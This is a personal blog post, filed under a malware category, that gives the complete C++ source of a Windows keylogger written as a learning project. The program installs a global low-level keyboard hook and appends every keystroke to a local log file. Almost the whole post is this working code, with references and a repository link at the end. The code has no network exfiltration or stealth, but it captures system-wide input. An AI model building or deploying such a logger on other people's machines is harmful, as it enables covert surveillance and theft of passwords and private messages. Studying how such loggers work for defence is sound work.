---
title: C++ Keylogger
date: 2023-02-02 00:00:00 +/-TTTT
categories: [Malware]
tags: [keylogger, c++]     # TAG names should always be lowercase
---

This post is dedicated to a personal project, in which I tried to understand and recreate the behavior of a software Keylogger made with C++ and running on Windows.

## Source code

```c++
#include <iostream>
#include <fstream>
#include <windows.h>

#define FILEPATH "log.txt"

std::string ConvertVkCode(DWORD vkCode) {
    std::string convertedKeyInput;

    switch (vkCode) {
        case VK_ADD : convertedKeyInput = "Numpad +"; break;
        case VK_ATTN : convertedKeyInput = "Attn"; break;
        // ...
        case VK_XBUTTON1 : convertedKeyInput = "X Button 1 **"; break;
        case VK_XBUTTON2 : convertedKeyInput = "X Button 2 **"; break;
        default:
            char keyChar = (char)vkCode;
            std::string temp(1, keyChar);
            convertedKeyInput = temp;
            break;
    }
    return convertedKeyInput;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    BOOL fEatKeystroke = FALSE;

    if (nCode == HC_ACTION)
    {
        PKBDLLHOOKSTRUCT press = (PKBDLLHOOKSTRUCT)lParam;
        DWORD vkCode = press->vkCode; // Get the virtual keycode
        if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN)) // Keydown
        {
            std::ofstream file(FILEPATH, std::ios_base::app);
            if (file.is_open())
            {
                file << ConvertVkCode(vkCode) << "\n";
                file.close();
            }
            else
            {
                std::cout << "Unable to open the log file.\n";
            }
            std::cout << ConvertVkCode(vkCode) << "\n";
        }
    }
    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

int main()
{
    // dwThreadId is set to 0 to make a global injection
    HHOOK hookLowLevelKeyboard = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        0,
        0
    );
    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL))
    {
        // This while loop keeps the hook
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hookLowLevelKeyboard);

    return 0;
}
```

## References

- [Keystroke logging](https://en.wikipedia.org/wiki/Keystroke_logging)
- [Hooking](https://en.wikipedia.org/wiki/Hooking)
- [Global injection and Hooking in Windows](https://m417z.com/Implementing-Global-Injection-and-Hooking-in-Windows)
- [Global Hook Sample](https://github.com/katahiromz/GlobalHookSample)
- [SetWindowsHookEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexw)
- [LowLevelKeyboardProc](https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc)

## Repository

[https://github.com/dig2root/Keylogger](https://github.com/dig2root/Keylogger)